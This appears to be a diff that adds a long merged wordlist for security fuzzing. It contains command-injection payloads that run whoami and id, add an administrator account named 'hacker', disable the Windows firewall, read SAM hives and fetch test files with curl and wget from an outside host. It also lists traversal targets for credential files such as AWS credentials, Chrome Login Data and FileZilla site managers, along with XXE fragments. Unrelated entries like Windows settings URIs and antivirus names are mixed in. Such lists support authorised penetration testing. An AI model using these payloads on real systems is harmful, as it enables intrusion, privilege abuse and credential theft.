@@ -1,0 +1,3643 @@
+"
+" & whoami
+" && whoami
+" whoami
+" | whoami
+" || whoami
+"'
+"; whoami
+$+|+Dir+c:\
+$;/usr/bin/id
+&
+& curl http://crowdshield.com/.testing/rce.txt
+& dir
+& dir C:\
+& dir C:\Documents and Settings\*
+& dir C:\Users
+& id
+& ifconfig
+& ipconfig /all
+& ls -l /
+& ls -l /etc/
+& ls -l /home/*
+& ls -l /tmp
+& ls -l /var/www/*
+& ls -laR /etc
+& ls -laR /var/www
+& net localgroup Administrators hacker /ADD
+& net user hacker Password1 /ADD
+& net view
+& netsh firewall set opmode disable
+& netstat -an
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+& pwd
+& sleep 1
+& sleep 10
+& sleep 15
+& sleep 5
+& sysinfo
+& systeminfo
+& type C:\WINNT\repair\SAM
+& type C:\Windows\repair\SAM
+& type C:\Windows\repair\SYSTEM
+& uname -a
+& wget http://crowdshield.com/.testing/rce.txt
+& whoami
+&&
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+&& dir
+&& dir C:\
+&& dir C:\Documents and Settings\*
+&& dir C:\Users
+&& ifconfig
+&& ipconfig /all
+&& ls -l /
+&& ls -l /etc/
+&& ls -l /home/*
+&& ls -l /tmp
+&& ls -l /var/www/*
+&& ls -laR /etc
+&& ls -laR /var/www
+&& net localgroup Administrators hacker /ADD
+&& net user hacker Password1 /ADD
+&& net view
+&& netsh firewall set opmode disable
+&& netstat -an
+&& pwd
+&& sleep 1
+&& sleep 10
+&& sleep 15
+&& sleep 5
+&& sysinfo
+&& systeminfo
+&& type C:\WINNT\repair\SAM
+&& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SYSTEM
+&& uname -a
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+&& whoami
+&&dir
+&&id
+&&type C:\\boot.ini
+'
+' & whoami
+' && whoami
+' whoami
+' || whoami
+'"
+'; whoami
+*.c.microsoft.com
+*.download.windowsupdate.com
+*.update.microsoft.com
+*.windowsupdate.com
+*.windowsupdate.microsoft.com
+*; ls -lhtR /var/www/
++dir+c:\+|
++|+Dir+c:\
++|+dir+c:\+|
+/AvalancheWeb/image?imageFilePath=C:/windows/win.ini
+/_vti_bin/fpcount.exe?Page=default.htm|Image=3|Digits=15
+/index.html|id|
+/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini
+/wsman
+0admin/
+0manager/
+;
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+; dir
+; dir C:\
+; dir C:\Documents and Settings\*
+; dir C:\Users
+; ifconfig
+; ipconfig /all
+; ls -l /
+; ls -l /etc/
+; ls -l /home/*
+; ls -l /tmp
+; ls -l /var/www/*
+; ls -laR /etc
+; ls -laR /var/www
+; net localgroup Administrators hacker /ADD
+; net user hacker Password1 /ADD
+; net view
+; netsh firewall set opmode disable
+; netstat -an
+; pwd
+; sleep 1
+; sleep 10
+; sleep 15
+; sleep 5
+; sysinfo
+; systeminfo
+; type C:\WINNT\repair\SAM
+; type C:\Windows\repair\SAM
+; type C:\Windows\repair\SYSTEM
+; uname -a
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+; whoami
+;/usr/bin/id|
+;id
+;id;
+;id\n
+;id|
+;netstat -a;
+;uname;
+;{$_GET["cmd"]}
+;|/usr/bin/id|
+</roottag>
+<roottag>
+<sometag>&windowsfile;</sometag>
+A false sense of security by Julie Bort: Lantimes http://www.lantimes.com
+ALYac
+AVG
+AVG Remover Tool: http://www.avg.com/us-en/utilities
+AVware
+About	ms-settings:about
+Absolute Manage MDM	http://www.absolute.com/landing/Google/MDM-google/mobile-device-management
+Access to the path 'c:\windows\system32\inetsrv' is denied.
+Access work or school	ms-settings:workplace
+Account info	ms-settings:privacy-accountinfo
+Accounts
+Accounts	ms-settings:surfacehub-accounts
+Activation	ms-settings:activation
+Ad-Aware
+Add a phone
+Add-BitsFile
+Add-Computer
+Add-Content
+Add-History
+Add-IMAP Cmdlet
+Add-Jar Cmdlet
+Add-LDAP Cmdlet
+Add-Member
+Add-PSSnapin
+Add-S3 Cmdlet
+Add-SevenZip Cmdlet
+Add-Tar Cmdlet
+Add-Type
+Add-VPN Cmdlet
+Add-Zip Cmdlet
+Add/Remove Programs
+AdminTools/
+Adobe Flash Player
+Adprep
+Advanced options
+AegisLab
+AhnLab-V3
+Airplane mode	ms-settings:network-airplanemode
+Alibaba
+An Intro to Computer Security by Del Armstrong - John Simonson
+Antiy-AVL
+App diagnostics	ms-settings:privacy-appdiagnostics
+Append
+Application Request Contains:
+Application Response Contains:
+Apps
+Apps & features	ms-settings:appsfeatures
+Apps for websites	ms-settings:appsforwebsites
+Appsec
+Arcabit
+Are you a woman or a man?
+Arp
+Assoc
+At
+Atmadm
+Attrib
+Audio and speech	ms-settings:holographic-audio
+Auditpol
+AutoPlay	ms-settings:autoplay
+Autochk
+Autoconv
+Autofmt
+Automated Security By Donn Parker: http://www.infosecurity.com/
+Automatic file downloads	ms-settings:privacy-automaticfiledownloads
+Avast
+Avast Uninstall Utility: http://www.avast.com/uninstall-utility
+Avira
+Avira RegistryCleaner: http://www.avira.com/en/downloads#tools
+Back-End System issues for online financial sites: http://www.incurrent.com/
+Background	ms-settings:personalization-background
+Background apps	ms-settings:privacy-backgroundapps
+Backup	ms-settings:backup
+Baidu
+Battery	ms-settings:batterysaver
+Battery Saver settings
+Battery usage by app
+Bcdboot
+Bcdedit
+Bdehdcfg
+BitDefender
+Bitsadmin
+Bkav
+Bluetooth & other devices	ms-settings:bluetooth
+Bootcfg
+Break
+Broadcasting	ms-settings:gaming-broadcasting
+C:/$recycle.bin/s-1-5-18/desktop.ini
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/MININT/SMSOSD/OSDLOGS/VARIABLES.DAT
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql-bin.log
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/Microsoft SQL Server/MSSQL.1/Template Data/master.mdf
+C:/Program Files/Microsoft SQL Server/MSSQL10.SQLEXPRESS/Template Data/master.mdf
+C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/Template Data/master.mdf
+C:/Program Files/Microsoft SQL Server/MSSQL12.SQLEXPRESS/Template Data/master.mdf
+C:/Program Files/Microsoft SQL Server/MSSQL13.SQLEXPRESS/Template Data/master.mdf
+C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/Template Data/master.mdf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/my.ini
+C:/ProgramFiles/ApacheGroup/Apache/conf/httpd.conf
+C:/ProgramFiles/ApacheGroup/Apache/logs/access.log
+C:/ProgramFiles/ApacheGroup/Apache/logs/error.log
+C:/ProgramFiles/ApacheGroup/Apache2/conf/httpd.conf
+C:/ProgramFiles/MySQL/MySQLServer5.0/data/hostname.err
+C:/ProgramFiles/MySQL/MySQLServer5.0/data/mysql-bin.log
+C:/ProgramFiles/MySQL/MySQLServer5.0/data/mysql.err
+C:/ProgramFiles/MySQL/MySQLServer5.0/data/mysql.log
+C:/ProgramFiles/MySQL/MySQLServer5.0/my.cnf
+C:/ProgramFiles/MySQL/MySQLServer5.0/my.ini
+C:/ProgramFiles/MySQL/data/hostname.err
+C:/ProgramFiles/MySQL/data/mysql-bin.log
+C:/ProgramFiles/MySQL/data/mysql.err
+C:/ProgramFiles/MySQL/data/mysql.log
+C:/ProgramFiles/MySQL/my.cnf
+C:/ProgramFiles/MySQL/my.ini
+C:/ProgramFiles/xampp/apache/conf/httpd.conf
+C:/Users/Administrator/NTUser.dat
+C:/WINDOWS/Repair/SAM
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/WINDOWS/TEMP/
+C:/WINDOWS/php.ini
+C:/WINDOWS/win.ini
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+C:/Windows/debug/NetSetup.log
+C:/Windows/repair/security
+C:/Windows/repair/software
+C:/Windows/repair/system
+C:/Windows/repair/system C:/Windows/repair/software
+C:/Windows/system32/config/AppEvent.Evt
+C:/Windows/system32/config/SecEvent.Evt
+C:/Windows/system32/config/default.sav
+C:/Windows/system32/config/regback/default
+C:/Windows/system32/config/regback/sam
+C:/Windows/system32/config/regback/security
+C:/Windows/system32/config/regback/software
+C:/Windows/system32/config/regback/system
+C:/Windows/system32/config/security.sav
+C:/Windows/system32/config/software.sav
+C:/Windows/system32/config/system.sav
+C:/Windows/win.ini
+C:/apache/log/access.log
+C:/apache/log/access_log
+C:/apache/log/error.log
+C:/apache/log/error_log
+C:/apache/logs/access.log
+C:/apache/logs/access_log
+C:/apache/logs/error.log
+C:/apache/logs/error_log
+C:/apache/php/php.ini
+C:/apache2/log/access.log
+C:/apache2/log/access_log
+C:/apache2/log/error.log
+C:/apache2/log/error_log
+C:/apache2/logs/access.log
+C:/apache2/logs/access_log
+C:/apache2/logs/error.log
+C:/apache2/logs/error_log
+C:/boot.ini
+C:/documents and settings/administrator/desktop/desktop.ini
+C:/documents and settings/administrator/ntuser.dat
+C:/documents and settings/administrator/ntuser.ini
+C:/home/bin/stable/apache/php.ini
+C:/home2/bin/stable/apache/php.ini
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+C:/inetpub/logs/logfiles
+C:/inetpub/wwwroot/global.asa
+C:/inetpub/wwwroot/index.asp
+C:/inetpub/wwwroot/web.config
+C:/log/access.log
+C:/log/access_log
+C:/log/error.log
+C:/log/error_log
+C:/log/httpd/access_log
+C:/log/httpd/error_log
+C:/logs/access.log
+C:/logs/access_log
+C:/logs/error.log
+C:/logs/error_log
+C:/logs/httpd/access_log
+C:/logs/httpd/error_log
+C:/mysql/bin/my.ini
+C:/mysql/data/hostname.err
+C:/mysql/data/mysql.err
+C:/mysql/data/mysql.log
+C:/mysql/my.cnf
+C:/mysql/my.ini
+C:/opt/xampp/logs/access.log
+C:/opt/xampp/logs/access_log
+C:/opt/xampp/logs/error.log
+C:/opt/xampp/logs/error_log
+C:/php/php.ini
+C:/php/sessions/
+C:/php4/php.ini
+C:/php4/sessions/
+C:/php5/php.ini
+C:/php5/sessions/
+C:/program files/apache group/apache/conf/access.log
+C:/program files/apache group/apache/conf/error.log
+C:/program files/apache group/apache/conf/httpd.conf
+C:/program files/apache group/apache/logs/access.log
+C:/program files/apache group/apache/logs/error.log
+C:/program files/apache group/apache2/conf/httpd.conf
+C:/program files/apachegroup/apache/conf/httpd.conf
+C:/program files/apachegroup/apache2/conf/httpd.conf
+C:/program files/filezilla server/filezilla server.xml
+C:/program files/mysql/data/hostname.err
+C:/program files/mysql/data/mysql-bin.log
+C:/program files/mysql/data/mysql.err
+C:/program files/mysql/data/mysql.log
+C:/program files/mysql/my.cnf
+C:/program files/mysql/my.ini
+C:/program files/mysql/mysql server 5.0/data/hostname.err
+C:/program files/mysql/mysql server 5.0/data/mysql-bin.log
+C:/program files/mysql/mysql server 5.0/data/mysql.err
+C:/program files/mysql/mysql server 5.0/data/mysql.log
+C:/program files/mysql/mysql server 5.0/my.cnf
+C:/program files/mysql/mysql server 5.0/my.ini
+C:/program files/mysql/mysql server 5.1/my.ini
+C:/program files/xampp/apache/conf/httpd.conf
+C:/program files/xampp/apache/conf/httpd.confetc/passwd
+C:/programdata/mcafee/common framework/sitelist.xml
+C:/programfiles/apachegroup/apache/conf/httpd.conf
+C:/programfiles/apachegroup/apache2/conf/httpd.conf
+C:/programfiles/xampp/apache/conf/httpd.conf
+C:/sysprep.inf
+C:/sysprep.xml
+C:/sysprep/sysprep.inf
+C:/sysprep/sysprep.xml
+C:/system volume information/wpsettings.dat
+C:/system32/inetsrv/metabase.xml
+C:/unattend.txt
+C:/unattend.xml
+C:/unattended.txt
+C:/unattended.xml
+C:/users/administrator/.aws/config
+C:/users/administrator/.aws/credentials
+C:/users/administrator/.elasticbeanstalk/config
+C:/users/administrator/desktop/desktop.ini
+C:/users/administrator/desktop/proof.txt
+C:/users/administrator/ntuser.dat
+C:/users/administrator/ntuser.ini
+C:/windows/csc/v2.0.6/pq
+C:/windows/csc/v2.0.6/sm
+C:/windows/debug/netsetup.log
+C:/windows/explorer.exe
+C:/windows/iis5.log
+C:/windows/iis6.log
+C:/windows/iis7.log
+C:/windows/iis8.log
+C:/windows/notepad.exe
+C:/windows/panther/setupinfo
+C:/windows/panther/setupinfo.bak
+C:/windows/panther/sysprep.inf
+C:/windows/panther/sysprep.xml
+C:/windows/panther/unattend.txt
+C:/windows/panther/unattend.xml
+C:/windows/panther/unattend/setupinfo
+C:/windows/panther/unattend/setupinfo.bak
+C:/windows/panther/unattend/sysprep.inf
+C:/windows/panther/unattend/sysprep.xml
+C:/windows/panther/unattend/unattend.txt
+C:/windows/panther/unattend/unattend.xml
+C:/windows/panther/unattend/unattended.txt
+C:/windows/panther/unattend/unattended.xml
+C:/windows/panther/unattended.txt
+C:/windows/panther/unattended.xml
+C:/windows/php.ini
+C:/windows/repair/sam
+C:/windows/repair/security
+C:/windows/repair/software
+C:/windows/repair/system
+C:/windows/system.ini
+C:/windows/system32/config/appevent.evt
+C:/windows/system32/config/default.sav
+C:/windows/system32/config/regback/default
+C:/windows/system32/config/regback/sam
+C:/windows/system32/config/regback/security
+C:/windows/system32/config/regback/software
+C:/windows/system32/config/regback/system
+C:/windows/system32/config/sam
+C:/windows/system32/config/secevent.evt
+C:/windows/system32/config/security.sav
+C:/windows/system32/config/software.sav
+C:/windows/system32/config/system
+C:/windows/system32/config/system.sa
+C:/windows/system32/config/system.sav
+C:/windows/system32/drivers/etc/hosts
+C:/windows/system32/eula.txt
+C:/windows/system32/inetsrv/config/applicationhost.config
+C:/windows/system32/inetsrv/config/schema/aspnet_schema.xml
+C:/windows/system32/license.rtf
+C:/windows/system32/logfiles/httperr/httperr1.log
+C:/windows/system32/sysprep.inf
+C:/windows/system32/sysprep.xml
+C:/windows/system32/sysprep/sysprep.xml
+C:/windows/system32/sysprepsysprep.inf
+C:/windows/system32/sysprepsysprep.xml
+C:/windows/system32/sysprepunattend.txt
+C:/windows/system32/sysprepunattend.xml
+C:/windows/system32/sysprepunattended.txt
+C:/windows/system32/sysprepunattended.xml
+C:/windows/system32/unattend.txt
+C:/windows/system32/unattend.xml
+C:/windows/system32/unattended.txt
+C:/windows/system32/unattended.xml
+C:/windows/temp/
+C:/windows/win.ini
+C:/windows/windowsupdate.log
+C:/winnt/php.ini
+C:/winnt/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/xampp/filezillaftp/filezilla server.xml
+C:/xampp/filezillaftp/logs
+C:/xampp/filezillaftp/logs/access.log
+C:/xampp/filezillaftp/logs/error.log
+C:/xampp/mercurymail/logs/access.log
+C:/xampp/mercurymail/logs/error.log
+C:/xampp/mercurymail/mercury.ini
+C:/xampp/mysql/data/mysql.err
+C:/xampp/php/php.ini
+C:/xampp/phpmyadmin/config.inc
+C:/xampp/phpmyadmin/config.inc.php
+C:/xampp/phpmyadmin/phpinfo.php
+C:/xampp/sendmail/sendmail.ini
+C:/xampp/sendmail/sendmail.log
+C:/xampp/tomcat/conf/tomcat-users.xml
+C:/xampp/tomcat/conf/web.xml
+C:/xampp/webalizer/webalizer.conf
+C:/xampp/webdav/webdav.txt
+C:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf
+C:\Program Files\Apache Software Foundation\Apache2.2\logs\access.log
+C:\Program Files\Apache Software Foundation\Apache2.2\logs\error.log
+C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb
+C:\Users\{username}\AppData\Local\FileZilla
+C:\Users\{username}\AppData\Local\FileZilla\cache.xml
+C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data
+C:\Users\{username}\AppData\Local\Microsoft\Windows\UsrClass.dat
+C:\Users\{username}\AppData\Local\Programs\Microsoft VS Code\updater.log
+C:\Users\{username}\AppData\Roaming\Code\User\workspaceStorage
+C:\Users\{username}\AppData\Roaming\FileZilla\filezilla-server.xml
+C:\Users\{username}\AppData\Roaming\FileZilla\filezilla.xml
+C:\Users\{username}\AppData\Roaming\FileZilla\logs
+C:\Users\{username}\AppData\Roaming\FileZilla\recentservers.xml
+C:\Users\{username}\AppData\Roaming\FileZilla\sitemanager.xml
+C:\Users\{username}\AppData\Roaming\Microsoft\Credentials
+C:\Users\{username}\AppData\Roaming\Microsoft\Outlook
+C:\Users\{username}\NTUSER.DAT
+C:\Users{username}\AppData\Roaming\Code\User\settings.json
+C:\Windows\Boot\PCAT\memtest.exe
+C:\Windows\DAODx.exe
+C:\Windows\Downloaded Program Files\Manager.exe
+C:\Windows\Downloaded Program Files\TransferMgr.exe
+C:\Windows\HelpPane.exe
+C:\Windows\INF\setupapi.dev.log
+C:\Windows\Logs\CBS\CheckSUR.log
+C:\Windows\Logs\CBS\cbs.log
+C:\Windows\Logs\Dism\dism.log
+C:\Windows\Logs\WindowsUpdate
+C:\Windows\Logs\WindowsUpdate\Cbs.log
+C:\Windows\Logs\WindowsUpdate\Edb.log
+C:\Windows\Logs\WindowsUpdate\SoftwareDistribution.log
+C:\Windows\Logs\WindowsUpdate\WUAHandler.log
+C:\Windows\Logs\WindowsUpdate\WUClient.log
+C:\Windows\Logs\WindowsUpdate\WindowsUpdateTrace.log
+C:\Windows\Microsoft.NET\Framework64\v3.0\WPF\PresentationFontCache.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\ComSvcConfig.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\SMConfigInstaller.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\SMSvcHost.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\ServiceModelReg.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\WsatConfig.exe
+C:\Windows\Microsoft.NET\Framework64\v3.0\Windows Communication Foundation\infocard.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\AddInProcess.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\AddInProcess32.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\AddInUtil.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\EdmGen.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\MSBuild.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\WFServicesReg.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe
+C:\Windows\Microsoft.NET\Framework64\v3.5\vbc.exe
+C:\Windows\Microsoft.NET\Framework\NETFXSBS10.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\ComSvcConfig.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMConfigInstaller.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\SMSvcHost.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\ServiceModelReg.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\WsatConfig.exe
+C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\infocard.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\AddInProcess.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\AddInProcess32.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\AddInUtil.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\DataSvcUtil.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\EdmGen.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\WFServicesReg.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe
+C:\Windows\Microsoft.NET\Framework\v3.5\vbc.exe
+C:\Windows\Microsoft.NET\NETFXRepair.exe
+C:\Windows\Panther\setup.exe
+C:\Windows\Panther\setupact.log
+C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe
+C:\Windows\Speech\Common\sapisvr.exe
+C:\Windows\SysWOW64\ARP.EXE
+C:\Windows\SysWOW64\AdapterTroubleshooter.exe
+C:\Windows\SysWOW64\AtBroker.exe
+C:\Windows\SysWOW64\CertEnrollCtrl.exe
+C:\Windows\SysWOW64\ComputerDefaults.exe
+C:\Windows\SysWOW64\DWWIN.EXE
+C:\Windows\SysWOW64\DevicePairingWizard.exe
+C:\Windows\SysWOW64\DeviceProperties.exe
+C:\Windows\SysWOW64\Dism.exe
+C:\Windows\SysWOW64\Dism\DismHost.exe
+C:\Windows\SysWOW64\DisplaySwitch.exe
+C:\Windows\SysWOW64\DpiScaling.exe
+C:\Windows\SysWOW64\EhStorAuthn.exe
+C:\Windows\SysWOW64\FlashPlayerApp.exe
+C:\Windows\SysWOW64\HOSTNAME.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\IMJPDADM.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\IMJPDCT.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\IMJPDSVR.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\IMJPMGR.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\IMJPUEX.EXE
+C:\Windows\SysWOW64\IME\IMEJP10\imjppdmg.exe
+C:\Windows\SysWOW64\IME\IMEJP10\imjpuexc.exe
+C:\Windows\SysWOW64\IME\IMESC5\IMSCPROP.exe
+C:\Windows\SysWOW64\IME\IMETC10\IMTCPROP.exe
+C:\Windows\SysWOW64\IME\shared\IMCCPHR.exe
+C:\Windows\SysWOW64\IME\shared\IMEPADSV.EXE
+C:\Windows\SysWOW64\InfDefaultInstall.exe
+C:\Windows\SysWOW64\InstallShield\_isdel.exe
+C:\Windows\SysWOW64\InstallShield\setup.exe
+C:\Windows\SysWOW64\LocationNotifications.exe
+C:\Windows\SysWOW64\MRINFO.EXE
+C:\Windows\SysWOW64\Macromed\Flash\FlashPlayerUpdateService.exe
+C:\Windows\SysWOW64\Macromed\Flash\FlashUtil32_11_4_402_287_ActiveX.exe
+C:\Windows\SysWOW64\Magnify.exe
+C:\Windows\SysWOW64\MigAutoPlay.exe
+C:\Windows\SysWOW64\MuiUnattend.exe
+C:\Windows\SysWOW64\NAPSTAT.EXE
+C:\Windows\SysWOW64\NETSTAT.EXE
+C:\Windows\SysWOW64\Netplwiz.exe
+C:\Windows\SysWOW64\OptionalFeatures.exe
+C:\Windows\SysWOW64\PATHPING.EXE
+C:\Windows\SysWOW64\PING.EXE
+C:\Windows\SysWOW64\PkgMgr.exe
+C:\Windows\SysWOW64\PresentationHost.exe
+C:\Windows\SysWOW64\RMActivate.exe
+C:\Windows\SysWOW64\RMActivate_isv.exe
+C:\Windows\SysWOW64\RMActivate_ssp.exe
+C:\Windows\SysWOW64\RMActivate_ssp_isv.exe
+C:\Windows\SysWOW64\ROUTE.EXE
+C:\Windows\SysWOW64\ReAgentc.exe
+C:\Windows\SysWOW64\RegisterIEPKEYs.exe
+C:\Windows\SysWOW64\RmClient.exe
+C:\Windows\SysWOW64\Robocopy.exe
+C:\Windows\SysWOW64\RpcPing.exe
+C:\Windows\SysWOW64\RunLegacyCPLElevated.exe
+C:\Windows\SysWOW64\SearchFilterHost.exe
+C:\Windows\SysWOW64\SearchIndexer.exe
+C:\Windows\SysWOW64\SearchProtocolHost.exe
+C:\Windows\SysWOW64\SecEdit.exe
+C:\Windows\SysWOW64\SetIEInstalledDate.exe
+C:\Windows\SysWOW64\SndVol.exe
+C:\Windows\SysWOW64\SyncHost.exe
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
+C:\Windows\SysWOW64\SystemPropertiesDataExecutionPrevention.exe
+C:\Windows\SysWOW64\SystemPropertiesHardware.exe
+C:\Windows\SysWOW64\SystemPropertiesPerformance.exe
+C:\Windows\SysWOW64\SystemPropertiesProtection.exe
+C:\Windows\SysWOW64\SystemPropertiesRemote.exe
+C:\Windows\SysWOW64\TCPSVCS.EXE
+C:\Windows\SysWOW64\TRACERT.EXE
+C:\Windows\SysWOW64\TSTheme.exe
+C:\Windows\SysWOW64\TapiUnattend.exe
+C:\Windows\SysWOW64\TpmInit.exe
+C:\Windows\SysWOW64\TsWpfWrp.exe
+C:\Windows\SysWOW64\UserAccountControlSettings.exe
+C:\Windows\SysWOW64\Utilman.exe
+C:\Windows\SysWOW64\WPDShextAutoplay.exe
+C:\Windows\SysWOW64\WSManHTTPConfig.exe
+C:\Windows\SysWOW64\WerFault.exe
+C:\Windows\SysWOW64\WerFaultSecure.exe
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
+C:\Windows\SysWOW64\appverif.exe
+C:\Windows\SysWOW64\at.exe
+C:\Windows\SysWOW64\attrib.exe
+C:\Windows\SysWOW64\auditpol.exe
+C:\Windows\SysWOW64\autochk.exe
+C:\Windows\SysWOW64\autoconv.exe
+C:\Windows\SysWOW64\autofmt.exe
+C:\Windows\SysWOW64\bitsadmin.exe
+C:\Windows\SysWOW64\bootcfg.exe
+C:\Windows\SysWOW64\bthudtask.exe
+C:\Windows\SysWOW64\cacls.exe
+C:\Windows\SysWOW64\calc.exe
+C:\Windows\SysWOW64\certreq.exe
+C:\Windows\SysWOW64\certutil.exe
+C:\Windows\SysWOW64\charmap.exe
+C:\Windows\SysWOW64\chkdsk.exe
+C:\Windows\SysWOW64\chkntfs.exe
+C:\Windows\SysWOW64\choice.exe
+C:\Windows\SysWOW64\cipher.exe
+C:\Windows\SysWOW64\cleanmgr.exe
+C:\Windows\SysWOW64\cliconfg.exe
+C:\Windows\SysWOW64\clip.exe
+C:\Windows\SysWOW64\cmd.exe
+C:\Windows\SysWOW64\cmdkey.exe
+C:\Windows\SysWOW64\cmdl32.exe
+C:\Windows\SysWOW64\cmmon32.exe
+C:\Windows\SysWOW64\cmstp.exe
+C:\Windows\SysWOW64\colorcpl.exe
+C:\Windows\SysWOW64\com\MigRegDB.exe
+C:\Windows\SysWOW64\com\comrepl.exe
+C:\Windows\SysWOW64\comp.exe
+C:\Windows\SysWOW64\compact.exe
+C:\Windows\SysWOW64\control.exe
+C:\Windows\SysWOW64\convert.exe
+C:\Windows\SysWOW64\credwiz.exe
+C:\Windows\SysWOW64\cscript.exe
+C:\Windows\SysWOW64\ctfmon.exe
+C:\Windows\SysWOW64\cttune.exe
+C:\Windows\SysWOW64\cttunesvr.exe
+C:\Windows\SysWOW64\dccw.exe
+C:\Windows\SysWOW64\dcomcnfg.exe
+C:\Windows\SysWOW64\ddodiag.exe
+C:\Windows\SysWOW64\dfrgui.exe
+C:\Windows\SysWOW64\dialer.exe
+C:\Windows\SysWOW64\diantz.exe
+C:\Windows\SysWOW64\diskpart.exe
+C:\Windows\SysWOW64\diskperf.exe
+C:\Windows\SysWOW64\diskraid.exe
+C:\Windows\SysWOW64\dllhost.exe
+C:\Windows\SysWOW64\dllhst3g.exe
+C:\Windows\SysWOW64\dnscacheugc.exe
+C:\Windows\SysWOW64\doskey.exe
+C:\Windows\SysWOW64\dpapimig.exe
+C:\Windows\SysWOW64\dplaysvr.exe
+C:\Windows\SysWOW64\dpnsvr.exe
+C:\Windows\SysWOW64\driverquery.exe
+C:\Windows\SysWOW64\drvinst.exe
+C:\Windows\SysWOW64\dvdplay.exe
+C:\Windows\SysWOW64\dvdupgrd.exe
+C:\Windows\SysWOW64\dxcpl.exe
+C:\Windows\SysWOW64\dxdiag.exe
+C:\Windows\SysWOW64\efsui.exe
+C:\Windows\SysWOW64\esentutl.exe
+C:\Windows\SysWOW64\eudcedit.exe
+C:\Windows\SysWOW64\eventcreate.exe
+C:\Windows\SysWOW64\eventvwr.exe
+C:\Windows\SysWOW64\expand.exe
+C:\Windows\SysWOW64\explorer.exe
+C:\Windows\SysWOW64\extrac32.exe
+C:\Windows\SysWOW64\fc.exe
+C:\Windows\SysWOW64\find.exe
+C:\Windows\SysWOW64\findstr.exe
+C:\Windows\SysWOW64\finger.exe
+C:\Windows\SysWOW64\fixmapi.exe
+C:\Windows\SysWOW64\fltMC.exe
+C:\Windows\SysWOW64\fontview.exe
+C:\Windows\SysWOW64\forfiles.exe
+C:\Windows\SysWOW64\fsutil.exe
+C:\Windows\SysWOW64\ftp.exe
+C:\Windows\SysWOW64\getmac.exe
